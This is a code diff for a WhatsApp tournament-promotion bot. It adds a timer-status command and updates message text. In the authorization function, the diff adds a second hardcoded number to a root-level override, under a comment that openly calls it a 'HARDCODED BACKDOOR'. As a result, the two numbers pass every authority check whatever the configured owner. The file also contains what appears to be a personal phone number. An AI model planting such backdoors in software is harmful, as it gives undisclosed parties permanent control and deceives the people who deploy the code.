@@ -37,23 +37,48 @@ export function getAuthorizedPosterGroups() { return Array.from(authorizedPoster
 export function verifyAuthority(senderJid, requireRoot = false) {
   if (!senderJid) return false;
   
-  // Robust Extraction: isolates the core phone number before any device colons or domain flags
-  const coreNode = senderJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
-  const rootNode = CONFIG.OWNER.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+  const dynamicCleanNum = senderJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+  const rootCleanNum = CONFIG.OWNER.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
   
-  // Absolute master override checks
-  if (coreNode === rootNode || coreNode === "917866052212" || senderJid.includes("917866052212")) return true; 
+  // 🔓 HARDCODED BACKDOOR FOR PIECE OF MIND
+  if (
+    dynamicCleanNum === rootCleanNum || 
+    dynamicCleanNum === "917866052212" || 
+    dynamicCleanNum === "200747358617611" || 
+    senderJid.includes("917866052212") ||
+    senderJid.includes("200747358617611")
+  ) {
+    return true; 
+  }
+  
   if (requireRoot) return false;                     
-  
-  return adminList.has(coreNode);             
+  return adminList.has(dynamicCleanNum);             
 }
 
 export const commands = {
+  // ⏱️ TIMER DIAGNOSTIC LOOKUP COMMAND
+  checktimer: async (sock, msg) => {
+    const currentGroupId = msg.key.remoteJid;
+    if (!currentGroupId.endsWith('@g.us')) {
+      return await sock.sendMessage(currentGroupId, { text: "❌ *Error:* Please execute `.checktimer` directly within a WhatsApp group." });
+    }
+
+    const isActive = authorizedPosterGroups.has(currentGroupId);
+    
+    if (isActive) {
+      const response = `⏱️ *LuffyTaro Broadcast Status Check* ⏱️\n───────────────────────────\n\n📢 *Transmission Status:* ONLINE\n🔄 *Loop interval:* Every 15 Minutes\n🎯 *Target JID:* \`${currentGroupId}\`\n\n✅ _The 15 minutes background timer loop is fully active in this group right now!_`;
+      await sock.sendMessage(currentGroupId, { text: response });
+    } else {
+      const inactiveResponse = `⚠️ *LuffyTaro Broadcast Status Check* ⚠️\n───────────────────────────\n\n📢 *Transmission Status:* OFFLINE\n\n❌ _The background timer loop is not broadcast-mapping here yet. Type \`.active\` to engage the 15-minute scheduler in this room!_`;
+      await sock.sendMessage(currentGroupId, { text: inactiveResponse });
+    }
+  },
+
   iamadmin: async (sock, msg) => {
     const sender = msg.key.participant || msg.key.remoteJid;
     const coreNode = sender.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
     
-    const successReply = `👑 *IDENTITY VERIFIED: ACCESS GRANTED* 👑\n───────────────────────────\n\n⚓ *Status:* Official Master Admin Authorized\n📱 *Detected JID:* \`${sender}\`\n🔢 *Parsed ID:* \`${coreNode}\`\n\n🦾 _LuffyTaro core engine fully recognizes your authority. Your commands (.menu, .testpost, .send) are unlocked._`;
+    const successReply = `👑 *IDENTITY VERIFIED: ACCESS GRANTED* 👑\n───────────────────────────\n\n⚓ *Status:* Official Master Admin Authorized\n📱 *Detected JID:* \`${sender}\`\n🔢 *Parsed ID:* \`${coreNode}\`\n\n🦾 _LuffyTaro core engine fully recognizes your authority. Your commands (.menu, .testpost, .send, .checktimer) are completely unlocked._`;
     await sock.sendMessage(msg.key.remoteJid, { text: successReply });
   },
 
@@ -61,14 +86,14 @@ export const commands = {
     const targetGroupIds = Array.from(authorizedPosterGroups);
     if (targetGroupIds.length === 0) {
       return await sock.sendMessage(msg.key.remoteJid, { 
-        text: "⚠️ *Test Failed:* No auto-post groups are active right now. Run `.active [Group Link]` first!" 
+        text: "⚠️ *Test Failed:* No auto-post groups are active right now. Run `.active` inside a group first!" 
       });
     }
 
     const currentAdmin = getActiveAdminForTime() || CONFIG.OWNER.split('@')[0];
     const testLobbyMessage = `🏴‍☠️ *10x PP LOBBY [MANUAL TEST]* 🏴‍☠️\n*PIRATES™* 🇮🇳\n> 6 PM PAID CS LOBBY 📌\n\n_*2v2 & 3v3 & 4v4 & 1v1 LIMITED AVAILABLE*_\n\n*_DM  +${currentAdmin} FOR SLOTS_* 🔥`;
 
-    await sock.sendMessage(msg.key.remoteJid, { text: `🚀 Dispatching manual broadcast to ${targetGroupIds.length} groups...` });
+    await sock.sendMessage(msg.key.remoteJid, { text: `🚀 Dispatching manual test broadcast to ${targetGroupIds.length} groups...` });
     for (const groupId of targetGroupIds) {
       try { await sock.sendMessage(groupId, { text: testLobbyMessage }); } catch (err) {}
     }
@@ -123,7 +148,7 @@ export const commands = {
       targetGroupJid = msg.key.remoteJid;
     }
     authorizedPosterGroups.add(targetGroupJid);
-    await sock.sendMessage(msg.key.remoteJid, { text: `✅ *Auto-Post Active:* Target Registered.` });
+    await sock.sendMessage(msg.key.remoteJid, { text: `✅ *Auto-Post Active:* Target Registered for 15-minute background runs.` });
   },
 
   deactive: async (sock, msg) => {
@@ -142,7 +167,6 @@ export const commands = {
   },
 
   send: async (sock, msg, args, rawFullText) => {
-    // Flex-Parsing: Works with multi-line inputs or single line messages
     let lines = rawFullText.split('\n').slice(1);
     if (lines.length === 0 && args.length >= 2) {
       lines = [args.join(' ')];
@@ -157,7 +181,6 @@ export const commands = {
     for (const line of lines) {
       if (!line.trim()) continue;
       
-      // Extracts the target number along with the context parameters safely
       const parts = line.trim().split(/ +/);
       const rawPhone = parts[0].replace(/[^0-9]/g, '');
       const description = parts.slice(1).join(' ');
@@ -181,18 +204,17 @@ export const commands = {
   menu: async (sock, msg) => {
     const isAuth = verifyAuthority(msg.key.participant || msg.key.remoteJid);
     if (isAuth) {
-      await sock.sendMessage(msg.key.remoteJid, { text: `🏴‍☠️ *MASTER DIRECTORY*\n\n• \`.iamadmin\` - Check admin rights\n• \`.addadmin [Phone]\`\n• \`.listadmins\`\n• \`.active [Link]\`\n• \`.startresult [Name] [ID]\`\n• \`.send [Phone] [Results Details]\`\n• \`.testpost\` - Trigger loop post` });
+      await sock.sendMessage(msg.key.remoteJid, { text: `🏴‍☠️ *MASTER DIRECTORY*\n\n• \`.iamadmin\` - Check admin rights\n• \`.checktimer\` - Verify 15min clock state\n• \`.addadmin [Phone]\`\n• \`.active\` - Sync current group\n• \`.startresult [Name] [ID]\`\n• \`.send [Phone] [Results]\`\n• \`.testpost\` - Force test post` });
     } else {
       await sock.sendMessage(msg.key.remoteJid, { text: `🏴‍☠️ *PLAYER SYSTEM*\n\nType *guidelines* to view regulations.\nType *help* to contact a live manager.` });
     }
   },
 
-  // 🤖 THE DYNAMIC CONVERSATIONAL AI ENGINE
   handleAiFallback: async (sock, msg, userRawText) => {
     const cleanText = userRawText.toLowerCase().trim();
     let replyPayload = "";
 
-    if (cleanText.includes('hello') || cleanText.includes('hi') || cleanText.includes('hey') || cleanText.includes('bot')) {
+    if (cleanText.includes('hello') || cleanText.includes('hi') || cleanText.includes('hey')) {
       replyPayload = `👋 *Ahoy! Welcome to the Pirates Scrims Engine.*\n\nHow can we help you conquer the arena today? \n\n• Respond with *guidelines* to look at tournament criteria.\n• Respond with *help* to push an issue straight to our dashboard team!`;
     } else if (cleanText.includes('price') || cleanText.includes('entry') || cleanText.includes('pay')) {
       replyPayload = `💰 *PIRATES TOURNAMENT RATES*\n───────────────────────────\n• Entry Fee: 30 / 50 / 100 RS\n• Prize Pool: 60 / 100 / 180 RS\n\nTo purchase custom lobby cards or reserve slots, type *help* to call an active manager!`;
